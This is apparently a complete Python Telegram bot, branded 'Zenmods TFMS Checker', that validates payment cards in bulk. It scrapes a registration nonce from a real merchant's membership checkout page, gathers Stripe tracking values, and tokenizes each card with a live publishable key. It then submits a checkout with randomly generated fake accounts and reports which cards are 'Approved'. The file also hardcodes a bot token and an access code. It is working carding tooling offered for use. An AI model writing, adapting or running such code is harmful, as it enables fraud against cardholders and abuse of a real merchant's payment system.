from datetime import datetime, timedelta
import io
import os
import random
import re
import string
import threading
import time
from bs4 import BeautifulSoup
import requests
import names
import telebot

TELEGRAM_BOT_TOKEN = "8664861867:AAF5Wq79aekFKDcE6vFT2jFO_3w4jjFgLmk"
SECRET_CODE = "Zenmods123"
authorized_users = set()

bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="Markdown")
print_lock = threading.Lock()

anasxzer00 = f"""
Join Channel for new updates.
"""

def mc_tools():
    banner = anasxzer00
    print_red(banner)

def by_anasxzer00(text):
    for char in text:
        print(f'\033[91m{char}\033[0m', end='', flush=True)
        time.sleep(0.03)
    print()

def print_line():
    print_red(f"""|-|==========================================|-|""")

def print_sline():
    print_cyan(f"""|----------------------------------------------|""")

def print_red(text): print(f"\033[91m{text}\033[0m")
def print_green(text): print(f"\033[92m{text}\033[0m")
def print_yellow(text): print(f"\033[93m{text}\033[0m")
def print_blue(text): print(f"\033[94m{text}\033[0m")
def print_magenta(text): print(f"\033[95m{text}\033[0m")
def print_cyan(text): print(f"\033[96m{text}\033[0m")
def print_white(text): print(f"\033[97m{text}\033[0m")
def print_grey(text): print(f"\033[90m{text}\033[0m")

def detectar_tipo_tarjeta(cc):
    if cc.startswith("4"):
        return "Visa"
    elif cc.startswith("5"):
        return "MasterCard"
    elif cc.startswith("3"):
        return "American Express"
    elif cc.startswith("6"):
        return "Discover"
    else:
        return "Desconocido"

def check_single_cc(cc_line):
    try:
        card = cc_line.replace('/', '|')
        partes = card.split("|")
        if len(partes) < 4:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Invalid format structure"
        
        cc = partes[0]
        mes = partes[1]
        ano = partes[2]
        if "20" in ano:
            ano = ano.split("20")[1]
        cvv = partes[3]

        vendor = detectar_tipo_tarjeta(cc)
        username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
        correo_rand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
        password = f"{names.get_first_name()}{names.get_last_name()}#{random.randint(1000000,9999999)}"

        session = requests.Session()

        # REQ1: Get Nonce from tfms.ro
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }
        response = session.get('https://tfms.ro/membership-account/membership-checkout/', headers=headers, timeout=20)
        if response.status_code != 200:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Checkout page GET failed (Status: {response.status_code})"

        nonce_tag = (BeautifulSoup(response.text, 'html.parser')).find("input", {"name": "woocommerce-register-nonce"})
        if not nonce_tag:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: Register nonce not found"

        # REQ2: Stripe MUID/GUID/SID
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }
        stripe_init = session.post('https://m.stripe.com/6', headers=headers, timeout=20).json()
        muid = stripe_init.get('muid', '')
        guid = stripe_init.get('guid', '')
        sid = stripe_init.get('sid', '')

        # REQ3: Stripe Tokenization
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }
        data_token = f'time_on_page={random.randint(10,99999)}&pasted_fields=email&guid={guid}&muid={muid}&sid={sid}&key=pk_live_APZPK16BMAmVqyx5GXaAgfGh&payment_user_agent=stripe.js%2F78{random.randint(10000,99999)}e{random.randint(1,9)}%3B+stripe-js-v3%2F{random.randint(1,9)}c{random.randint(1000,9999)}{random.randint(1,9)}e{random.randint(1,9)}&card[number]={cc}&card[exp_month]={mes}&card[exp_year]={ano}&card[cvc]={cvv}'

        token_res = session.post('https://api.stripe.com/v1/tokens', headers=headers, data=data_token, timeout=20).json()
        if 'id' not in token_res:
            err_msg = token_res.get('error', {}).get('message', 'Unknown tokenization error')
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {err_msg}"
        
        id_ = token_res['id']

        # REQ4: Checkout Submission to tfms.ro
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }
        data_checkout = {
            'level': '2',
            'checkjavascript': '1',
            'username': username,
            'password': password,
            'password2': password,
            'bemail': correo_rand,
            'bconfirmemail': correo_rand,
            'fullname': '',
            'CardType': vendor,
            'tos': '1',
            'submit-checkout': '1',
            'javascriptok': '1',
            'stripeToken0': id_,
            'AccountNumber': f'XXXXXXXXXXXX{cc[12:]}',
            'ExpirationMonth': mes,
            'ExpirationYear': ano,
        }

        checkout_res = session.post('https://tfms.ro/membership-account/membership-checkout/', headers=headers, data=data_checkout, timeout=20).text
        response_code = (BeautifulSoup(checkout_res, 'html.parser')).find(class_="pmpro_message pmpro_error", id='pmpro_message')

        error_message = response_code.get_text() if response_code else checkout_res

        if "Your card's security code is incorrect." in error_message:
            return f"ZENMODS CHECKER ⚡\nCCN ✅\n{card}\nStatus: Your card's security code is incorrect."
        elif "Your card has insufficient funds." in error_message:
            return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: Your card has insufficient funds."
        elif "succeeded" in error_message or "pmpro_success" in checkout_res:
            return f"ZENMODS CHECKER ⚡\nApproved ✅\n{card}\nStatus: CHARGE SUCCESSFUL!"
        else:
            return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{card}\nReason: {error_message.strip()}"

    except Exception as e:
        return f"ZENMODS CHECKER ⚡\nDeclined ❌\n{cc_line}\nReason: Exception -> {str(e)}"

def process_bulk_file(chat_id, file_content):
    lines = [line.strip() for line in file_content.decode("utf-8").splitlines() if line.strip()]
    total_cards = len(lines)

    if total_cards == 0:
        bot.send_message(chat_id, "⚠️ File is empty or no cards found!")
        return

    bot.send_message(chat_id, f"⚡ **Zenmods TFMS Sequential Engine** ⚡\nTotal cards: `{total_cards}`.\n🚀 Checking strictly 1 by 1 in real-time...")

    for index, card_line in enumerate(lines, start=1):
        res = check_single_cc(card_line)
        bot.send_message(chat_id, f"📌 **Result [{index}/{total_cards}]**:\n\n{res}")
        time.sleep(2)

    bot.send_message(chat_id, "🏁 **All cards checked successfully!**")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome to Zenmods TFMS Checker Bot! Send /auth <code > to authorize or upload a text file.")

@bot.message_handler(commands=['auth'])
def authorize_user(message):
    try:
        parts = message.text.split()
        if len(parts) > 1 and parts[1] == SECRET_CODE:
            authorized_users.add(message.chat.id)
            bot.reply_to(message, "✅ Authorization successful! You can now send card lists.")
        else:
            bot.reply_to(message, "❌ Invalid secret code!")
    except Exception as e:
        bot.reply_to(message, "⚠️ An error occurred.")

@bot.message_handler(commands=['chk'])
def handle_single_card_cmd(message):
    chat_id = message.chat.id
    if chat_id not in authorized_users:
        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Format: `/chk card|mm|yy|cvv`")
        return
    
    card_line = parts[1].strip()
    bot.send_message(chat_id, "🔍 Checking single card...")
    res = check_single_cc(card_line)
    bot.send_message(chat_id, f"📌 **Single Card Report:**\n\n{res}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    chat_id = message.chat.id
    if chat_id not in authorized_users:
        bot.reply_to(message, "⛔ You are not authorized! Use `/auth <secret_code>` first.")
        return

    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        process_bulk_file(chat_id, downloaded_file)
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error processing file: {str(e)}")

if __name__ == "__main__":
    mc_tools()
    print_line()
    by_anasxzer00(' -- Zenmods Telegram Bot Engine Initialized Successfully!')
    bot.infinity_polling()
